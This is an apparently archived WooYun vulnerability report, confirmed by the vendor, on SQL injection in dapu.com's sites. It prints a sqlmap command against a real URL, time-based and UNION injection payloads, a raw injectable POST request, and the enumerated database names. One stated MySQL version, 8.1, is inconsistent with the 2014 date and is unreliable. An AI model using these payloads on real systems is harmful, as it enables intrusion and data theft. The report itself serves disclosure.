{"id": 50896, "wybug_id": "wooyun-2014-076448", "wybug_title": "大扑网m站SQL注入", "wybug_corp": "大朴网", "wybug_author": "小饼仔", "wybug_date": "2014-09-18 14:57", "wybug_open_date": "2014-11-02 14:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向公众公开  简要描述： 说句题外话，能再要一个邀请码吗？可以的话发到我邮箱，多谢。这个是第一个发现的注入点，time-based blind，跑的比较慢，但是可以跑的出来。6个数据库，有一个数据库ecstoreprd有219张表对吧。嘿嘿，其实这个我跑了一半，略慢，没跑完，数据库信息是我从另外一个PC站的注入点拿到的，发现M站和PC同一个数据库，速度那是杠杠的，链接：http://www.dapu.com/dapubaby.html，萌宝征集令活动，里面原本有个输入宝宝编号查看宝宝照片的功能，不过今天晚上被和谐掉了，原因你懂得，PS.没干啥坏事，只是瞧一瞧~ 详细说明：  \n注入点是M站,链接：http://m.dapu.com/mgallery-items--1.html?scontent=%E9%95%BF\n\nsqlmap:python sqlmap.py -u \"http://m.dapu.com/mgallery-items--1.html?scontent=%E9%95%BF\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:18:23[00:18:23] [INFO] resuming back-end DBMS 'mysql'[00:18:23] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: scontent    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: scontent=%E9%95%BF') AND SLEEP(5) AND ('rlZQ'='rlZQ---[00:18:23] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11\n\n数据库available databases [6]:[*] ecstoreprd[*] information_schema[*] mysql[*] ocsprd[*] performance_schema[*] test\n\n顺便附上已经被和谐的注入点：POST /vote-ajax_get_vote_list_order.html HTTP/1.1Host: www.dapu.comProxy-Connection: keep-aliveContent-Length: 64Accept: */*Origin: http://www.dapu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36Content-Type: application/x-www-form-urlencodedDNT: 1Referer: http://www.dapu.com/dapubaby.htmlAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4batch_id=20140725&now_page=0&vote_type=a&search_key=123&limit=20\n\nsqlmap:sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: limit    Type: UNION query    Title: MySQL UNION query (NULL) - 6 columns    Payload: batch_id=20140725&now_page=0&vote_type=a&search_key=123&limit=20 UNION ALL SELECT CONCAT(0x716f666d71,0x71516d4c68674d536944,0x7177757771),NULL,NULL,NULL,NULL,NULL#---[00:39:27] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 8.1\n   漏洞证明：     修复方案：  你懂得   版权声明：转载请注明来源 小饼仔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-19 17:08 厂商回复： 漏洞已确认 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}